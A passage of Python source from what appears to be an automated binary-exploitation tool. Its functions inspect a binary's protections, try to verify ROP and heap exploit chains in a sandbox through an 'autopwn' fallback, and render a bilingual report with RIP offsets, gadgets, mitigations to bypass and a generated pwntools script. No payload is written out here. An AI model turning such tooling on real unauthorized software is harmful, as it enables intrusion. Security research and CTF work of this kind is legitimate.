        "Exploit VERIFICADO (autopwn)" if es else "VERIFIED exploit (autopwn)",
        (f"tecnica '{name}' ejecutada en sandbox por el motor completo de autopwn (29 tecnicas) "
         f"-> objetivo alcanzado" if es else
         f"technique '{name}' executed in sandbox by the full autopwn engine (29 techniques) "
         f"-> goal reached"),
        ("prueba: " + "  ".join(f"{k}={v}" for k, v in pl.proof.items()) if pl.proof else
         ("sin detalle de prueba estructurado" if es else "no structured proof detail")),
        "chainanalyzer no habia verificado ninguna cadena; autopwn cubre un conjunto de tecnicas "
        "mucho mas amplio (incluye todas las de heap)" if es else
        "chainanalyzer had not verified any chain; autopwn covers a much wider technique set "
        "(includes every heap technique)"))


def plan_for_binary(binary: str, text: str = "", cve: str = "", lang: str = "es",
                    verify: bool = True, has_public_exploit: bool = False,
                    poc_ref_url: str = "") -> ExploitPlan:
    """Concreta el esquema con un binario cargado: rellena offset/gadgets/objetivo reales via el
    Analizador de cadenas y, si `verify`, VERIFICA el exploit en sandbox (script + prueba). Si no se
    da `text`, infiere la clase (overflow -> control de RIP) de los hechos del binario.

    Si `verify` y el Analizador de cadenas NO verifica ningun exploit, intenta ademas el motor
    completo de `autopwn` (ver `_augment_with_autopwn`) antes de rendirse -- cubre muchas mas
    tecnicas (todo lo construido en `workflows/autopwn.py`: heap, SROP, ret2csu, dl-resolve...)
    que las ~6 cadenas que el Analizador de cadenas sabe modelar."""
    import os
    facts = {}
    an = None
    try:
        from ..oracles import build_registry
        reg = build_registry(binary)
        cs = reg.get("r2_checksec")
        r = cs.run() if cs else None
        if r and r.ok:
            facts = {"nx": r.meta.get("nx"), "pie": r.meta.get("pic"),
                     "canary": r.meta.get("canary"), "relro": r.meta.get("relro")}
    except Exception:
        pass
    try:
        from .chainanalyzer import analyze_chains
        an = analyze_chains(binary, None, verify=verify, lang=lang)
    except Exception:
        an = None
    pl = plan_from_analysis(an, facts, binary_name=os.path.basename(binary), text=text,
                            cve=cve, lang=lang, has_public_exploit=has_public_exploit,
                            poc_ref_url=poc_ref_url)
    _augment_with_autopwn(pl, binary, lang, verify)
    return pl


def render_plan(pl: ExploitPlan, lang: str = "es") -> str:
    es = lang == "es"
    if not pl.ok:
        return ("## Plan de explotacion\n\n" + (pl.note or ""))
    out = ["## " + ("Esquema de explotacion" if es else "Exploitation schema") +
           (f": {pl.cve}" if pl.cve else "")]
    out.append((f"- **Clase**: {pl.vuln_class}\n- **Primitiva**: {pl.primitive}" if es else
                f"- **Class**: {pl.vuln_class}\n- **Primitive**: {pl.primitive}"))
    # concrecion con el binario cargado (datos reales)
    if pl.concrete:
        c = pl.concrete
        cl = [("**Concreto (binario)**:" if es else "**Concrete (binary)**:")]
        if c.get("offset") is not None:
            cl.append(("  - offset a RIP: " if es else "  - RIP offset: ") + f"`{c['offset']}`")
        if c.get("reg_gadgets"):
            cl.append("  - gadgets: " + ", ".join(f"{k.upper()}@`{v}`" for k, v in c["reg_gadgets"].items()))
        if c.get("pivot"):
            cl.append("  - pivot RSP: `" + str(c["pivot"]) + "`")
        cl.append(("  - objetivo: " if es else "  - target: ") + f"`{c.get('target','?')}`"
                  + f" ({c.get('gadgets_total',0)} gadgets)")
        out.append("\n".join(cl))
    if pl.verified:
        out.append(("\n> **EXPLOIT VERIFICADO** por ejecucion en sandbox: cadena "
                    f"`{pl.concrete.get('chain','?')}`, "
                    + "  ".join(f"{k}={v}" for k, v in pl.proof.items() if k != "output" and v)
                    if es else
                    "\n> **VERIFIED EXPLOIT** by sandbox execution: chain "
                    f"`{pl.concrete.get('chain','?')}`, "
                    + "  ".join(f"{k}={v}" for k, v in pl.proof.items() if k != "output" and v)))
    out.append("\n### " + ("Fases" if es else "Phases"))
    for i, ph in enumerate(pl.phases, 1):
        out.append(f"{i}. **{ph.name}**: {ph.goal}\n   - " + ("como" if es else "how") + f": {ph.technique}"
                   + ("\n   - " + ("necesita" if es else "needs") + f": {ph.needs}" if ph.needs else ""))
    if pl.mitigations:
        out.append("\n### " + ("Mitigaciones a sortear" if es else "Mitigations to bypass"))
        out += [f"- {m}" for m in pl.mitigations]
    if pl.kb_refs:
        out.append("\n" + ("Referencias del conocimiento (RAG): " if es else "Knowledge refs (RAG): ")
                   + ", ".join(pl.kb_refs))
    if pl.script:
        out.append("\n### " + ("Exploit reproducible (pwntools)" if es else "Reproducible exploit (pwntools)")
                   + "\n```python\n" + pl.script + "\n```")
    out.append("\n_" + ("Solo objetivos autorizados / CTF / research." if es else
                        "Authorized / CTF / research targets only.") + "_")
    return "\n".join(out)
